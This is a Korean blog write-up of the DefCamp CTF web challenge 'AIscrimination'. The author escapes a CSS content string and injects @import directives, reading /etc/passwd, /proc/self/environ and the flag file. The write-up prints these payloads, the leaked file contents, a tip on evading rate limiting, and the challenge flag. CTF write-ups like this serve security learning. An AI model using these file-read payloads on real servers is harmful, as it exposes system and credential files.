## title: "DefCamp CTF - AIscrimination (Web) Write-up" date: 2026-09-22 21:00:00 +09:00 categories: [CTF, Web] tags: [DefCamp, Web, CSS Injection, LFI, Burp Suite] pin: false description: CSS의 @import 지시문을 악용한 LFI로 서버의 flag 파일을 읽어낸 DefCamp 웹 문제 AIscrimination 풀이.

## 문제 개요

- 대회: **DefCamp CTF**
- 문제: **AIscrimination** (Web)
- 팀: mollu
- 환경: macOS, Burp Suite (Proxy, Repeater, 내장 브라우저, Decoder)

**Flag**

```plain
CTF{5bb9cb8b8ff43e243fe85fceaf646e7ba6a5c80250e96678be2aa71add38eb97}

```

![AIscrimination flag inline in identity.css](/assets/img/posts/fig1.png)_그림 1. `GET /assets/cards/<id>/identity.css` 응답 — `content`에 flag가 인라인됨_

## 취약점 분석

카드마다 서버가 동적으로 생성하는 스타일시트 `/assets/cards/<id>/identity.css`는, 가입(`POST /join`) 시 입력한 `statement` 값을 CSS `content:"..."` 안에 **필터·이스케이프 없이 그대로 삽입**한다.

이 스타일시트 컴파일러는 `@import "<경로>"` 지시문을 만나면 해당 로컬 파일을 읽어 CSS로 인라인한다. 따라서 `content` 문자열을 탈출한 뒤 `@import`를 주입하면 **서버의 임의 파일을 읽을 수 있다(LFI).**

짧고 반복적인 요청을 막는 `429` 오류는 요청 간격을 두어 회피하고, `/proc/self/environ`으로 앱 경로를 파악한 뒤 `@import "/home/ctf/flag.txt"`로 플래그 파일을 읽어 flag를 획득했다.

## 사용한 도구

Burp Suite (Proxy, Repeater, 내장 브라우저, Decoder). 컴퓨터 환경은 macOS에서 진행.

## 1. 주입 지점 확보

Burp 내장 브라우저로 Be included 폼(`POST /join`)을 한 번 제출하고, **Proxy > HTTP history**에서 그 요청을 우클릭하여 **Repeater**로 보낸다.

생성된 카드는 `/people/<profile_id>`로 게시되고, 카드 전용 스타일시트는 `/assets/cards/<profile_id>/identity.css`에서 서빙된다.

`profile_id`는 응답의 `Set-Cookie: session` 값을 Burp Decoder로 Base64 디코딩(형태: `{"profile_id":"..."}`)하거나, 홈 피드 HTML의 `/people/<id>` 링크에서 얻는다.

## 2. LFI 확인 (/etc/passwd)

Repeater에서 `statement` 값을 아래 페이로드로 교체하여 전송한다. (content 문자열 탈출 → `@import` 주입 → 나머지 주석 처리)

```plain
statement = x"}@import "/etc/passwd";/*

```

![POST /join with @import /etc/passwd payload](/assets/img/posts/fig2.png)_그림 2. `POST /join` 요청 — `statement`에 CSS 문자열 탈출 + `@import "/etc/passwd"` 주입 (응답 302, Set-Cookie에 새 profile_id)_

이어서 같은 Repeater로 발급된 카드의 스타일시트를 요청한다.

```plain
GET /assets/cards/<profile_id>/identity.css

```

응답의 `content:`에 파일 내용이 인라인되어 LFI가 증명된다. (줄바꿈은 `\A`로 표현됨)

```plain
content: "root:x:0:0:root:/root:/bin/bash\A ...
ctf:x:1000:1000::/home/ctf:/bin/sh\A ";

```

![/etc/passwd inlined in identity.css response](/assets/img/posts/fig3.png)_그림 3. `GET /assets/cards/<id>/identity.css` 응답에 `/etc/passwd`가 인라인됨 (Repeater)_

![Card page rendering the file contents](/assets/img/posts/fig4.png)_그림 4. 카드 페이지(`/people/<id>`)에 파일 내용이 그대로 렌더된 화면_

## 3. 환경 정찰

플래그 파일 위치를 찾기 위해 프로세스 환경변수를 읽는다.

```plain
statement = x"}@import "/proc/self/environ";/*

```

응답에서 `HOME=/home/ctf`, `PWD=/home/ctf/app`, `THEME_ROOT=/home/ctf/app/themes/generated` 등을 확인한다. (gunicorn 실행 모듈 `app:app` → 앱은 `/home/ctf/app/app.py`)

![/proc/self/environ response revealing app path](/assets/img/posts/fig5.png)_그림 5. `/proc/self/environ` 응답 — `PWD=/home/ctf/app` 등 앱 경로 확인_

## 4. 플래그 파일 읽기

존재하지 않는 파일은 `/* design fragment unavailable */`로 조용히 스킵되므로, 후보 경로들을 한 번에 `@import`한다.

```plain
statement = x"}@import "/home/ctf/app/flag.txt";@import "/home/ctf/flag.txt";@import "/flag.txt";/*

```

스타일시트 응답에 `/home/ctf/flag.txt`의 내용이 인라인되어 플래그가 노출된다.

```plain
content: "CTF{5bb9cb8b8ff43e243fe85fceaf646e7ba6a5c80250e96678be2aa71add38eb97}\A ";

```

> 짧고 반복적인 요청은 `429 Too Many Requests`(`Retry-After` 헤더)로 차단되므로, 각 요청 사이에 시간 간격을 둔다. {: .prompt-tip }
